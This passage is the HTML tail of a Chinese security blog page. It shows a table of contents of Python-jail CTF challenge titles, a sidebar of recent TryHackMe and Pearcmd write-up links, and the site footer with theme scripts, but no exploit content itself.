href="#calc-jail-beginner-level4-0-5"><span class="toc-number">1.2.0.7.</span> <span class="toc-text">calc_jail_beginner_level4.0.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4-1"><span class="toc-number">1.2.0.8.</span> <span class="toc-text">calc_jail_beginner_level4.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginer-level4-2"><span class="toc-number">1.2.0.9.</span> <span class="toc-text">calc_jail_beginer_level4.2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4-3"><span class="toc-number">1.2.0.10.</span> <span class="toc-text">calc_jail_beginner_level4.3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level5"><span class="toc-number">1.2.0.11.</span> <span class="toc-text">calc_jail_beginner_level5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level5-1"><span class="toc-number">1.2.0.12.</span> <span class="toc-text">calc_jail_beginner_level5.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level6"><span class="toc-number">1.2.0.13.</span> <span class="toc-text">*calc_jail_beginner_level6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level6-1"><span class="toc-number">1.2.0.14.</span> <span class="toc-text">calc_jail_beginner_level6.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level7"><span class="toc-number">1.2.0.15.</span> <span class="toc-text">calc_jail_beginner_level7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lake-lake-lake"><span class="toc-number">1.2.0.16.</span> <span class="toc-text">lake lake lake</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#l-ke-l-ke-l-ke"><span class="toc-number">1.2.0.17.</span> <span class="toc-text">l@ke l@ke l@ke</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#laKe-laKe-laKe"><span class="toc-number">1.2.0.18.</span> <span class="toc-text">laKe laKe laKe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lak3-lak3-lak3"><span class="toc-number">1.2.0.19.</span> <span class="toc-text">lak3 lak3 lak3</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/" title="TryHackMe房间之Persisting Active Directory">TryHackMe房间之Persisting Active Directory</a><time datetime="2025-05-26T16:00:00.000Z" title="发表于 2025-05-27 00:00:00">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BBilling/" title="TryHackMe房间之Billing">TryHackMe房间之Billing</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BEnterprise/" title="TryHackMe房间之Enterprise">TryHackMe房间之Enterprise</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BReset/" title="TryHackMe房间之Reset">TryHackMe房间之Reset</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用">Pearcmd总结及利用</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By deCOLE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>